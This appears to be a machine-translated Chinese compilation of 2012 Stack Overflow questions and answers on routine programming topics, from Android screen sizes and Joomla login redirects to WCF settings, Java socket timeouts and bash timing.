我已阅读有关[支持多个屏幕](http://developer.android.com/guide/practices/screens_support.html/)的 Android 指南。我尝试遵循这些准则，例如，对于小部件，我将它们的高度和宽度设置为 wrap_content 或 fill_parent，并且我避免使用特定的像素测量值。对于图像，我为不同的密度提供替代位图资源，或者有时我使用具有与密度无关的像素 (dip) 的特定大小，因此系统将在屏幕上以不同的密度正确调整其大小。

在过去的 2 年里，我可能已经阅读了数十次该指南。

我知道我可以为特定的屏幕尺寸和密度定义特定的资源（例如布局），但是我想支持数十或数百部手机，所以这似乎是徒劳的。[我在该指南](http://developer.android.com/guide/practices/screens_support.html/)中看到表 3显示了一些常见的屏幕尺寸，但我想确保我的应用程序几乎可以在每部手机上运行。

在我看来，我需要知道的是最窄的屏幕（倾角）和最短的屏幕。也就是说，我想知道高度与宽度的比例。

例如，在纵向中，也许我有一个按钮列表或其他小部件。我真的很想知道哪款手机最短：宽高比最大，所以我可以看看我的布局是否在底部被切断。也许我也有 3 个标签：我想知道最窄的屏幕，这样我就可以确保标签不会在右侧被切断。

如果我知道所有当前 Android 手机的最小和最大 h/w 比，对于纵向，我可以仅在两个 Android 虚拟设备（甚至只是 Eclipse 中的自定义屏幕）上进行测试。

我已经开始检查[Wikipedia 的 Android 设备列表](http://en.wikipedia.org/wiki/Comparison_of_Android_devices/)，但一定有人有更好的方法。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-10T13:50:49.447

不幸的是，我还没有找到。我有这个链接：[按像素密度排列的显示器列表，](http://en.wikipedia.org/wiki/List_of_displays_by_pixel_density)但并非全部都是 Android 设备。我知道有一些奇怪的设备具有方形屏幕比例（摩托罗拉）。但我会简单地坚持[谷歌的屏幕尺寸列表](http://developer.android.com/guide/practices/screens_support.html#testing)，你应该对 99.9% 的用户安全。

Edit1：[有关屏幕尺寸和密度的统计信息](http://developer.android.com/about/dashboards/index.html)

Edit2：根据我的经验，我通常会进行 5 次快速检查：

1.  16:9 比例的 HDPI 手机上的应用程序
2.  4:3 比例的 MDPI 手机上的应用
3.  XHDPI 手机上的应用程序
4.  LDPI 手机上的应用程序
5.  大屏幕平板电脑上的应用程序（通常是 MDPI）

我觉得在这 5 种情况下，我涵盖了所有屏幕密度（特别是检查图像尺寸）、最常见的屏幕比例（4:3 和 16:9，检查所有布局元素是否可访问）和两种最常见的屏幕尺寸（手机和平板电脑）。

# javascript - 需要第 1 页 Javascript 来操作我在第 2 页上插入的 DIV？

> ID：12820842
> 
> 赞同：0
> 
> 时间：2012-10-10T13:44:54.613
> 
> 标签：javascript, html, query-string, yahoo-api, yahoo-search

我目前正在编写标准的“Yahoo Hosted Web Search”脚本，但有一些问题。

在我的主页 (index.html) 上的搜索框中，您输入一个查询，然后点击提交进行雅虎搜索以在同一页面上返回结果。

此提交操作会触发主页上的 yahoo javascript 通过放置加载结果 iframe 的适当 div 来返回同一页面上的搜索结果。

完整的过程脚本如下：

==================================================== ===========

<form id="searchform" onsubmit="return search();">

```
 <input type="text" id="searchbox" size="10" />
        <input type="submit" value="Submit"/>
    </form > 
```

：

==================================================== ====================

```
 <script type="text/javascript">
        function search() {
            YHS.search(document.getElementById("searchbox").value);
    </script> 
```

==================================================== ====================

提取命令::::::::::::::::::::

dom_id: "bossDiv", // BOSS Hosted Search iframe 渲染的 div 标签的 id

==================================================== ====================

```
 <div id="bossDiv">
    </div> 
```

这是显示 BOSS 托管搜索体验的空 div 标签。您需要在 Javascript 代码段中用这个 div id ('bossDiv') 替换

================

现在基本上我想确保我的结果显示在第二页而不是主页上。问题是 DIV TAG：ID 'bossDiv' 在主页上加载 iframe.. 无论如何我可以将此 DIV 插入到说 results.html 并让主页以某种方式命令 results.html 页面上的 div 以显示搜索结果呢？

一直在努力尝试表单操作等，但我可以看到这将起作用的唯一方法是，如果我只是将 div 插入 results.html 页面并以某种方式告诉 index.html 上的雅虎 javascript 在哪里可以找到 DIV 或重定向找到并触发DIV的页面？？有谁知道一种方法来告诉 java 在哪里可以找到另一个页面上的 div 以在查询搜索提交时触发和操作它..？

请帮助它已经破坏了我的大脑至少 2 周了，我不知道从在线阅读大量混乱中采取什么步骤:(

谢谢大家！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-10T13:48:16.133

您无法通过 javascript 访问其他页面 - 一种常见的搜索方法是使用 QueryString

[如何在 JavaScript 中获取查询字符串值？](https://stackoverflow.com/questions/901115/how-can-i-get-query-string-values)

# localization - 如何根据 Settings.bundle 选择检测本地化（故事板应用程序）

> ID：12820846
> 
> 赞同：3
> 
> 时间：2012-10-10T13:45:01.020
> 
> 标签：localization, storyboard

我正在开发一个 iOS 应用程序，它结合了故事板和本地化（基于两种语言，即英语和斯洛文尼亚语）。

我为这两种语言创建了两个文件夹（en.lproj 和 sl.lproj）。两者都有 InfoPlist.string 和 MainStoryboard.storyboard 文件。我还需要通过Settings.bundle来实现语言选择。

我已经创建了 Settings.bundle 并且能够从设备设置选项中的应用设置中选择语言。

现在我的麻烦点是：

1.  如何获取用户最近从设置中设置的 AppliactionDidBecomeActive 上的选定值？
2.  获得此值后，如何加载选定的语言文件夹（例如 en.lproj 等）
3.  如何在设备语言设置中获得斯洛文尼亚语选项？

我的应用程序将通过选择设备语言或选择我的 NSBundle 设置来运行。

请根据某些代码部分向我提供建议或以任何其他方式帮助我。

谢谢你，等待好的回应。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T03:58:53.547

1.

> ```
> NSString * lan = [[NSLocale preferredLanguages] objectAtIndex:0];
> 
> NSLog(@"language :%@",lan); 
> ```

1.  不确定我是否理解您的问题（应该是自动的）。
2.  如果 iOs 尚不支持斯洛文尼亚语，您将无法在语言设置中看到。

简而言之，您可能需要在您的应用程序中添加语言选择选项。并使用 NSLocalizedStringFromTable 函数手动更改语言（包括情节提要）。

希望这有帮助

# entity-framework - 组和计数。简化代码

> ID：12820850
> 
> 赞同：1
> 
> 时间：2012-10-10T13:45:15.030
> 
> 标签：entity-framework

我正在计算每天创建的用户数，如下所示：

```
IEnumerable<DateTime> dates = GetAllDatesForPeriod();

var rows = context.Users
  .Where(x => x.Created >= minDate && x.Created <= max.Date)
  .GroupBy(x => new { Year = x.Created.Year, Month = x.Created.Month, Day = x.Created.Day })
  .Select(x => new { Year = x.Key.Year, Month = x.Key.Month, Day = x.Key.Day, Count = x.Count() }).ToList()
  .Select(x => new DataModel { Date = new DateTime(x.Year, x.Month, x.Day), Users = x.Count }).ToList();

  rows.AddRange(dates.Where(x => !rows.Any(y => y.Date == x)).Select(x => new DataModel { Date = x, Users = 0 })); 
```

第二个 Select 是因为我无法在 Ef 查询中创建 DateTime。

AddRange 是用 Count = 0 填充缺失的日期。

此代码正在运行。但是有没有办法简化这个？

谢谢你，米格尔

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T22:05:40.520

这是主要查询：

```
var rows = context.Users
    .Where(x => x.Created >= minDate && x.Created <= max.Date)
    .GroupBy(u => EntityFunctions.TruncateTime(u.Created))
    .Select(g => new DataModel { Date = g.Key, Count = g.Count() }).ToList(); 
```

之后，您可以像以前一样添加缺失的日期。

# login - 更改 Joomla 登录页面的重定向 URL

> ID：12820854
> 
> 赞同：2
> 
> 时间：2012-10-10T13:45:23.247
> 
> 标签：login, joomla

我正在使用joomla登录页面，但需要更改登录的操作页面，目前为`form action="<?php echo JRoute::_('index.php', true, $this->params->get('usesecure')); ?>" onsubmit="return validate()" method="post" name="com-login" id="com-form-login">`

需要更改为

```
form action="<?php echo JRoute::_('index.php?option=com_contushdvideoshare&view=myvideos', true, $this->params->get('usesecure')); ?>" onsubmit="return validate()" method="post" name="com-login" id="com-form-login"> 
```

可能的？？任何帮助解决它？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-10T13:50:59.753

您不能通过登录模块执行此操作吗？

只需为要访问的 url 创建一个菜单项，然后在登录模块参数的“登录重定向页面”下拉列表中选择它。

![在此处输入图像描述](../Images/623ea4e759382dc820b8f4f06a33849c.png)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-04-04T06:22:17.860

我自己也有这个问题，就像我可以将我的登录模块配置为在成功登录后重定向到特定页面，但 com_user 登录视图仍然重定向到 joomla 用户配置文件页面。[**这个插件似乎可以解决问题。**](http://extensions.joomla.org/extensions/access-a-security/site-access/login-redirect/15257)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-10T13:51:37.433

登录模块的重定向是通过模块管理器完成的。

因此，在 Joomla 后端，转到“模块管理器”，然后打开登录模块，您将在右侧看到它的参数。

# jquery - 仅当自动宽度大于当前宽度时才更改元素的宽度（选择框）-jquery

> ID：12820857
> 
> 赞同：0
> 
> 时间：2012-10-10T13:45:29.537
> 
> 标签：jquery, html, css, jsp

这是超级无聊超级烦人的 IE 选择框问题！

我已经成功解决了...

查询：

```
$(function(){
    if($.browser.msie){
        $("select:not(#wrkTimeFrm,#wrkTimeFrm1,#wrkTimeTo,#wrkTimeTo1)")
            .focus(function(){
            $(this).css("width","auto");
            $(this).css("position","absolute");
        });
        $("select:not(#wrkTimeFrm,#wrkTimeFrm1,#wrkTimeTo,#wrkTimeTo1)")
            .blur(function(){
            $(this).css("width","145px");
            $(this).css("position","inherit");
        });
    }
}) 
```

……但那只是到现在为止。

正如你所看到的：not(id)s 是选择框，其大小是/应该小于145px，即它不应该改变。它工作正常。但是这样的选择框列表太多了，无法以这种方式处理。此外，ID 是动态的，我不知道谁的宽度大于/小于 145 像素（选项是动态的……显然）。

所以现在，我只在其自动宽度大于其当前宽度时才尝试更新选择框的宽度。就像是：

```
$(function(){
    if($.browser.msie){
        $("select").focus(function(){
            if(autoWidth>currentWidth){
            do_the_rest();
            }
        });
    }
}); 
```

我正在为 'autoWidth' 和 'currentWidth'($(".dd").outerWidth() 提供一些想法，宽度为 145，但我担心如果我可以将它用于 currentWidth，因为我得到了更多比具有相同 css 类“dd”的同一 jsp 上的一个选择框，尽管事件仅针对“this”选择框触发。可能有人可以让我知道如何获取焦点下选择框的类名...也许！......比outerWidth。）。

所以请帮忙！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T14:07:34.973

我发现很难理解你的意思，特别是因为你没有包含任何小提琴甚至生成的 HTML 代码......但我想也许你想要做的是：

```
$(function(){
    if($.browser.msie){
        $("select").focus(function(){
            if($(this).width()>145){
              $(this).css("width","auto");
            }
        });
    }
}); 
```

**更新：**

```
$(function() {
    $("select").focus(function() {
        if ($(this).width() > 95) {
            var prevWidth = $(this).width();
            $(this).css("width", "auto");
            if ($(this).width() < 100) {
                $(this).css("width", 100 + "px");
            }
            $(this).blur(function() {
                $(this).css("width", prevWidth + "px");
            });
        }

    });

});​ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T13:51:36.773

我想如果你使用 % 作为你的 CSS 宽度，这个问题处理

```
width:80%; 
```

# c# - 当应用程序有超过 2 个表单而不多次显示消息框时如何关闭整个应用程序

> ID：12820858
> 
> 赞同：1
> 
> 时间：2012-10-10T13:45:35.727
> 
> 标签：c#, winforms

我正在使用 Windows 窗体开发应用程序。该项目包含 3 个表单：一个登录表单是主表单，另外两个是登录表单的子表单。

我的问题是当想要通过`Application.Exit()`在表单关闭事件中使用我的消息框多次显示对话框来关闭整个应用程序时。

1.登录表单中的此代码，即主表单：

```
private void FrmLogIn_FormClosing(object sender, FormClosingEventArgs e)
    {
        DialogResult loginResult = MessageBox.Show("Do you want to close this application?","Close",MessageBoxButtons.YesNo,MessageBoxIcon.Warning);
        if (loginResult == DialogResult.Yes)
        {
            Application.Exit();
        }
    } 
```

2.AdminForm关闭事件，它是登录表单的子表单：

```
 private void FrmAdmin_FormClosing(object sender, FormClosingEventArgs e)
    {
        DialogResult loginResult = MessageBox.Show("Do you want to close this application?","Close",MessageBoxButtons.YesNo,MessageBoxIcon.Warning);
        if (loginResult == DialogResult.Yes)
        {
            Application.Exit();
        }
    } 
```

3.Billoperations 表单关闭事件，它是登录表单的子表单：

```
private void FrmBillOperation_FormClosing(object sender, FormClosingEventArgs e)
{
    DialogResult loginResult = MessageBox.Show("Do you want to close this application?","Close",MessageBoxButtons.YesNo,MessageBoxIcon.Warning);
    if (loginResult == DialogResult.Yes)
    {
        Application.Exit();
    }
} 
```

当我以任何形式单击关闭按钮时，它只会显示一次 MessageBox 消息。请帮我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T13:49:24.640

使所有 FormClosing 方法调用一个`ApplicationShutdown`在中心位置处理此问题的函数。您不想将此代码复制到您创建的每个新表单中。

在这种方法中，您可以检查一个名为例如的布尔值（注意线程安全）`IsShuttingDown`。如果它已经正确，请离开该方法，否则您提出问题并开始退出。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-10T14:18:15.167

`FormClosingEventArgs`传递给`FormClosing`事件的实例有一个[CloseReason](http://msdn.microsoft.com/en-us/library/system.windows.forms.closereason.aspx)属性，该属性将`CloseReason.ApplicationExit`在 Application 类的 Exit 方法被调用时设置：您的处理程序应检查此情况，如果是，则不采取进一步行动。

```
private void FrmLogIn_FormClosing(object sender, FormClosingEventArgs e)
{
    if (e.CloseReason == CloseReason.ApplicationExit)
        return;

   ...
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-10T13:52:24.153

您可以尝试使用此代码

```
FormCollection fc = Application.OpenForms;
if (fc!= null && fc.Count > 0)
{
   for (int i = 1; i < fc.Count; i++)
    {
       if (fc!= null && fc.IsDisposed!= true)
        {
          fc.Dispose();
        }
   }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-12-02T22:35:07.837

```
private void sh_interface_FormClosing(object sender, FormClosingEventArgs e)
    {
        if (MessageBox.Show("This will close down the whole application. Confirm?", "Close Application", MessageBoxButtons.YesNo) == DialogResult.Yes)
        {
          foreach (Form f in Application.OpenForms)
            {
                if (!f.IsDisposed)
                f.Dispose();
            }
        }
        else
        {
            e.Cancel = true;
            this.Activate();
        }   
    } 
```

这将关闭所有表单，包括来自 Application.Run(new something()) 的隐藏表单和主表单...此外，当在模板类 Form Closing 事件中编码时，在继承类中调用此方法时有效。

# ios - 用谓词过滤数组，限制结果？

> ID：12820860
> 
> 赞同：2
> 
> 时间：2012-10-10T13:45:41.927
> 
> 标签：ios, arrays, nsarray, nspredicate, array-filter

我正在过滤一个可以包含许多带有谓词的对象的数组。出于性能原因，我想限制返回的结果。数组未排序，因此一旦达到限制，我希望搜索停止。

这可能吗？我不确定是通过谓词指令还是其他方式。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-10T13:58:32.133

`indexesOfObjectsPassingTest`我认为您可以使用and的这种组合`objectsAtIndexes`：

```
NSUInteger count = 0;
NSUInteger limit = ...;
NSIndexSet *set = [myArray indexesOfObjectsPassingTest:^BOOL(id obj, NSUInteger idx, BOOL *stop) {
    BOOL pass = ... // check if object passes test;
    if (pass) {
        count++;
        if (count >= limit)
            *stop = YES;  // stops further processing of the array
    }
    return pass;
}];

NSArray *filteredArray = [myArray objectsAtIndexes:set]; 
```

# erlang - Erlang 主管重启间隔

> ID：12820868
> 
> 赞同：9
> 
> 时间：2012-10-10T13:46:05.313
> 
> 标签：erlang, erlang-otp, erlang-supervisor

我有一个具有`one_for_one`重启策略的主管。是否可以在子进程重新启动之间设置一些时间间隔？

例如，远程数据库崩溃了，我想在恢复连接尝试之间等待 10 秒。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-10T15:04:52.553

实际上，您可以让主管立即重新启动其子代并实现所谓的*延迟初始化*：

1.  主管（重新）启动（立即）孩子（例如，gen_server）
2.  gen_server 在其 init 函数中返回 0 超时
3.  在 handle_info 中，您进行主动等待（您的 10 秒）以确保数据库已正确初始化

这样，您可以确保在正确初始化数据库后处理对 gen_server 的所有请求。

# c# - 为 WCF 服务客户端增加 MaxItemsInObjectGraph

> ID：12820871
> 
> 赞同：0
> 
> 时间：2012-10-10T13:46:11.460
> 
> 标签：c#, wcf

我正在从 C# dll 引用 WCF 服务，因此不会读取生成的 app.config 文件。我正在尝试通过以下代码手动创建服务客户端；但是，我收到需要增加 MaxItemsInObjectGraph 的错误。正在运行的服务已经设置为 int.MaxValue，所以我现在只需要在 TestServiceClient 中增加它。有任何想法吗？？提前致谢！

```
var client = new TestServiceClient(GetBinding(), GetEndpointAddress());

private static EndpointAddress GetEndpointAddress()
        {
            var endpoint = new EndpointAddress("https://localhost:8000/ServiceModel/service");

            return endpoint;
        }

        private static Binding GetBinding()
        {
            var basicHttpBinding = new BasicHttpBinding(BasicHttpSecurityMode.Transport)
            {
                MessageEncoding = WSMessageEncoding.Text,
                TextEncoding = Encoding.UTF8,
                BypassProxyOnLocal = false,
                UseDefaultWebProxy = true,
                CloseTimeout = new TimeSpan(10, 0, 0),
                OpenTimeout = new TimeSpan(10, 0, 0),
                SendTimeout = new TimeSpan(10, 0, 0),
                ReceiveTimeout = new TimeSpan(10, 0, 0),
                HostNameComparisonMode = HostNameComparisonMode.StrongWildcard,
                MaxBufferPoolSize = Int32.MaxValue,
                MaxReceivedMessageSize = Int32.MaxValue,
                AllowCookies = false,
                TransferMode = TransferMode.StreamedResponse,
                ReaderQuotas =
                {
                    MaxDepth = 32,
                    MaxStringContentLength = Int32.MaxValue,
                    MaxArrayLength = 6553600,
                    MaxBytesPerRead = 4096,
                    MaxNameTableCharCount = 16384
                }
            };

            return basicHttpBinding;
        } 
```

以下是我的解决方案：

```
private static ITestServiceClient GetClient()
        {
            var factory = new ChannelFactory<ITestServiceClient >(GetBinding(), GetEndpointAddress());

            foreach (var dataContractBehavior in factory.Endpoint.Contract.Operations
                .Select(operation => operation.Behaviors.Find<DataContractSerializerOperationBehavior>())
                .Where(dataContractBehavior => dataContractBehavior != null))
            {
                dataContractBehavior.MaxItemsInObjectGraph = Int32.MaxValue;
            }

            var client = factory.CreateChannel();

            return client;
        } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-10T14:01:23.470

在 client.Endpoint.Contract.Operations 中尝试

```
foreach (var operation in operations)
{
   var dataContractBehavior = operation.Behaviors.Find<DataContractSerializerOperationBehavior>();
   if (dataContractBehavior != null)
   {
      dataContractBehavior.MaxItemsInObjectGraph = value;
   }
} 
```

# sparql - 如何在使用推理时提高 sparql 查询的性能？

> ID：12820873
> 
> 赞同：2
> 
> 时间：2012-10-10T13:46:14.027
> 
> 标签：sparql, semantic-web, virtuoso

我想提高我的 sparql 查询的性能。我必须运行所有类型的 sparql 查询。我在图中总共有 17,500,000 个三元组，并且我还有其他仅包含知识的图。该图包含相同的 as 和 subclassOf 属性。该图的总三倍数约为 50,000,000，我在 sparql 查询中使用动态推理。

我正在使用 virtuoso 作为数据库。它具有推理功能。

当我使用推理运行查询时，简单查询需要 80 秒。在不使用推理的情况下，它需要 10 秒。

Sparql 查询：

```
 DEFINE input:inference 'myrule' 
 select DISTINCT  ?uri1  ?uri2  
 from <GRAPH_NAME>  
 where {?uri1   rdf:type ezdi:Aspirin. 
 ?patient ezdi:is_treated_with ?uri1\. 
 ?patient rdf:type ezdi:Patient. 
 ?uri2 rdf:type ezdi:Hypertension .
 ?patient ezdi:is_suffering_with ?uri2\. 
 ?patient rdf:type ezdi:Patient  } ORDER BY ?patient 
```

我已经完成了大师提供的所有索引。系统有 32 GB RAM。而且我已经完成了 NumberOfBuffer 设置 virtuoso.ini 文件。

我不知道推理有什么问题。但我必须在 sparql 查询中使用推理。

如果你知道一些事情，那么请分享你的想法。

谢谢你

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-22T00:29:49.233

一个 5M 三元组的本体是相当大的，虽然严格来说，这不是问题。与推理有关的性能与本体的表达能力比它的大小更紧密地联系在一起。您可以创建一个具有几个数量级的三元组的本体，这将难以推理。

话虽如此，我没有什么特别建议的。Virtuoso 特定的调优最好留给他们的开发人员，因此您可能会在他们的邮件列表中获得一些牵引力。

您似乎正在使用一些自定义推理“my_rule”——尽管在评论中您还声称 RDFS 和 sameAs。你可能需要弄清楚你*实际*使用的是什么推理，你的本体属于什么配置文件（RDFS 或 OWL2 QL、RL、EL、DL），并了解一些关于推理的实际工作原理。此外，等式推理很困难，您声称除了 RDFS 之外还使用了它。Virtuoso 可能会急切地计算等价关系，这可以减少查询的开销，但同样，您应该在他们的邮件列表中处理这些问题。

推理无论如何都不容易，除了使用更简单的（即表达性较差的）本体或更少的数据或两者兼而有之之外，没有任何灵丹妙药可以神奇地加快推理速度。

最后，您可以尝试其他为推理而设计的数据库，例如[OWLIM](http://www.ontotext.com/owlim)或[Stardog](http://stardog.com)。并非所有的数据库都是一样的，完全有可能你在你的 TBox 中编码了一些 Virtuoso 可能无法很好处理的东西，但可以被另一个系统轻松处理。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-05T21:26:28.450

There are *many* factors which could lead to the performance issue you describe. The most common is to make an error in the NumberOfBuffers setting in the INI file -- which we cannot see, and so cannot diagnose, here.

Questions specifically regarding Virtuoso are generally best raised on the [public OpenLink Discussion Forums](http://boards.openlinksw.com/support/), the [Virtuso Users mailing list](http://sourceforge.net/mailarchive/forum.php?forum_name=virtuoso-users), or through a [confidential Support Case](http://support.openlinksw.com/support/online-support.vsp). If you bring this there, we should be able to help you in more detail.

# java - setSoTimeout 的功能是什么以及它是如何工作的？

> ID：12820874
> 
> 赞同：58
> 
> 时间：2012-10-10T13:46:16.390
> 
> 标签：java, networking, connection

我正在尝试自己学习 Socket。我对 Oracle 网站上的以下文字有点困惑。我对此有一些疑问。提前感谢您提供任何明确的解释。

> **setSoTimeout**
> 
> public void setSoTimeout(int timeout) 抛出 SocketException
> 
> 使用指定的超时启用/禁用 SO_TIMEOUT，以毫秒为单位。将此选项设置为非零超时，与此 Socket 关联的`read()`调用`InputStream`将仅阻塞此时间量。如果超时到期，`java.net.SocketTimeoutException`则引发 a，尽管 Socket 仍然有效。必须在进入阻塞操作之前启用该选项才能生效。超时必须 > 0。超时为零被解释为无限超时。

1.  SO_TIMEOUT 是什么？
2.  套接字是连接的端点。如果我说

    ```
    mySocket.setSoTimeout(2000); 
    ```

    这是否意味着我在 2000 毫秒内阻止从服务器/客户端读取此套接字的任何输入，并且在此时间之后套接字已准备好读取数据？

3.  超时过期是什么意思？

4.  在阻止操作之前必须启用的选项是什么？

5.  无限超时意味着套接字不再读取？

* * *

## 回答 #1

> 赞同：49
> 
> 时间：2013-05-06T12:39:22.770

> 这是否意味着我在 2000 毫秒内阻止从服务器/客户端读取此套接字的任何输入，并且在此时间之后套接字已准备好读取数据？

不，这意味着如果在 2000 毫秒内没有数据到达，`SocketTimeoutException`则会抛出一个。

> 超时过期是什么意思？

这意味着 2000 毫秒（在您的情况下）过去了，没有任何数据到达。

> 在阻止操作之前必须启用的选项是什么？

没有一个“必须”启用。如果您的意思是“可能启用”，这就是其中之一。

> 无限超时意味着套接字不再读取？

多么奇怪的建议。这意味着如果没有数据到达，您将永远阻塞读取。

* * *

## 回答 #2

> 赞同：37
> 
> 时间：2012-10-10T14:00:58.610

[JavaDoc](http://docs.oracle.com/javase/7/docs/api/java/net/Socket.html#setSoTimeout%28int%29)很好地解释了它：

> 将此选项设置为非零超时，对与此 Socket 关联的 InputStream 的 read() 调用将仅阻塞此时间量。如果超时到期，则会引发 java.net.SocketTimeoutException，尽管 Socket 仍然有效。必须在进入阻塞操作之前启用该选项才能生效。超时必须 > 0。超时为零被解释为无限超时。

`SO_TIMEOUT`是`read()`呼叫将阻塞的超时时间。如果达到超时，将抛出[java.net.SocketTimeoutException 。](http://docs.oracle.com/javase/7/docs/api/java/net/SocketTimeoutException.html)如果您想永远阻塞将此选项设置为零（默认值），那么`read()`调用将阻塞，直到可以读取至少 1 个字节。

* * *

## 回答 #3

> 赞同：13
> 
> 时间：2012-10-10T14:37:02.417

这个例子让我明白了一切：
你可以看到 setSoTimeout 防止程序挂起！它等待`SO_TIMEOUT`时间！如果它没有收到任何信号，它就会抛出异常！这意味着时间已过！

```
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketTimeoutException;

public class SocketTest extends Thread {
  private ServerSocket serverSocket;

  public SocketTest() throws IOException {
    serverSocket = new ServerSocket(8008);
    serverSocket.setSoTimeout(10000);
  }

  public void run() {
    while (true) {
      try {
        System.out.println("Waiting for client on port " + serverSocket.getLocalPort() + "...");
        Socket client = serverSocket.accept();

        System.out.println("Just connected to " + client.getRemoteSocketAddress());
        client.close();
      } catch (SocketTimeoutException s) {
        System.out.println("Socket timed out!");
        break;
      } catch (IOException e) {
        e.printStackTrace();
        break;
      }
    }
  }

  public static void main(String[] args) {
    try {
      Thread t = new SocketTest();
      t.start();
    } catch (IOException e) {
      e.printStackTrace();
    }
  }
} 
```

# c# - 隐藏 LINQ to SQL DataContext 的构造函数

> ID：12820882
> 
> 赞同：1
> 
> 时间：2012-10-10T13:46:34.687
> 
> 标签：c#, visual-studio-2010, linq, linq-to-sql

我正在使用 LINQ to SQL 类*（**DataContext**）*连接到我的数据库。我有三个具有相同架构的数据库`Development`：`Staging`和`Live`. 我已经意识到，如果它们具有相同的模式，我可以使用相同的 DataContext 连接到它们——只需更改我传递给 DataContext 构造函数的连接字符串。我已经声明了一个接口，以便对创建 DataContext 的所有调用都通过它：

```
public interface IDataContextCreator
    {
        MyDataContext CreateDataContext();
    } 
```

现在我可以有这个接口的具体实现来连接到`Development`数据库。`Staging``Live`

我现在想***隐藏我的 DataContext 构造函数***，以强制所有对创建**DataContext**的调用都通过上述接口。如果我将**DataContext**的可访问性更改为`internal`，则无法在解决方案的其他项目中使用它。理想情况下，我希望将类可访问性修饰符保留为，`public`但将构造函数更改为`internal`. 有没有办法在自动生成的类中做到这一点？这个问题还有其他解决方案吗？

谢谢你。

**编辑：** 乔恩你是对的，应该制作构造函数`internal`。我的**数据层**中有这些，我不希望其他项目/层中的类访问这些构造函数。然而，他们应该只能使用接口创建**DataContext**，然后使用创建的**DataContext——**因为它将在类级别上是公共的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-10T13:58:59.003

[您可以在http://l2st4.codeplex.com/](http://l2st4.codeplex.com/)用 T4 模板替换 VS 代码生成。有了这个，您就可以修改构造函数的代码，使其受到保护而不是公开。

但是，我想知道为什么您要使用单独的数据上下文，而不是仅仅更改配置文件中的连接信息并使用转换来为您的特定构建操作提取适当的连接字符串。请参阅[http://msdn.microsoft.com/en-us/library/dd465326.aspx](http://msdn.microsoft.com/en-us/library/dd465326.aspx)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-10T13:58:08.700

您可以将构造函数声明为受保护。

```
public class MyDataContext : DataContext {
    protected MyDataContext() {
    }
} 
```

# wcf-ria-services - 如何处理 DomainContext？

> ID：12820883
> 
> 赞同：0
> 
> 时间：2012-10-10T13:46:35.117
> 
> 标签：wcf-ria-services, silverlight-5.0

DomainContext 在创建实例时会消耗大量内存。如果实例是局部变量，看起来内存没有自动释放，代码如下：

```
MyDomainContext  ctx = new MyDomainContext();
....
ctx=null; 
```

如何为 DomainContext 的实例释放内存？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T07:47:54.870

DomainContext doesn't implements IDisposable so you must rely on GarbageCollector to free up your memory. Be sure to remove any reference to the DomainContext instance than call `System.GC.Collect()`
You shouldn't bother about the entities loaded by the domaincontext and still referenced somewhere in the code, as long as I know WCF Ria services keep only a WeakReference to them

# bash - 以秒为单位打印经过的时间，尾随三位数字

> ID：12820884
> 
> 赞同：1
> 
> 时间：2012-10-10T13:46:40.257
> 
> 标签：bash

对于我正在编写的框架，我想测量执行一段（bash）代码需要多少时间，然后以秒为单位打印经过的时间。

为了测量，我执行以下操作：

```
start=$(date +%s%N)

# do something here

elapsed_time=$(($(date +%s%N) - start)) 
```

这给了我经过的秒数和经过的纳秒。如果我现在将其除以 1000000，我将以毫秒为单位获得时间

```
elapsed_time_in_ms=$(($elapsed time / 1000000)) 
```

这一切都很好，似乎可以工作，但真正的问题是我想以这种格式打印它：

```
12.789s 
```

其中之前`.`是秒，点之后是 ms 值的最后 3 位。

我将如何实现这样的目标？

**编辑**

我知道时间可能没有多大用处，但我仍然想实现这一点（即使只是出于美观的原因:-)）。

**编辑 2**

对于任何面临同样问题的人：

最后，我选择使用时间，因为它不需要分叉，而且似乎是最便携的解决方案。

看看[这里](https://github.com/helpermethod/bash-specs/blob/master/src/bash-specs.sh)`it`的函数和全局`total_elapsed_time`变量，看看我是如何实现的。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-10T13:52:45.587

您可以使用`bc`命令：

```
elapsed_time_in_ms=$(echo "scale=3;$elapsed_time/1000000" | bc) 
```

基本上设置你想要的`scale`位数`.`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-10T15:41:29.217

这也可以使用 shell 参数扩展或 via 来完成`printf`。例如，运行以下两个序列，一个接一个地打印出来`1349883230.715`，`1349883230.721`在一个运行中，`1349884003.025`在`1349884003.032`另一个运行中。（`%N`日期格式用前导零填充。）

```
 s=$(date +%s.%N); s=${s%??????}; echo $s
  t=$(printf "%20.3f" $(date +%s.%N)); echo $t 
```

*正如在模式匹配*下的 man bash 中提到的，特殊模式字符`?`匹配任何单个字符。如*Parameter Expansion*中所述，该表单 `${parameter%word}` 删除了匹配的后缀模式：“如果模式匹配尾随部分......扩展是具有最短匹配模式（“%”案例）或最长匹配模式的参数的扩展值（“%%”案例）已删除。”

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-11T05:11:38.177

只需在前三个纳秒后将数字切掉即可。

printf "%d.%.3ss\n" `date +%S` `date +%N`# 顺便说一句，只运行一次 date 可能不是非常不明智的。

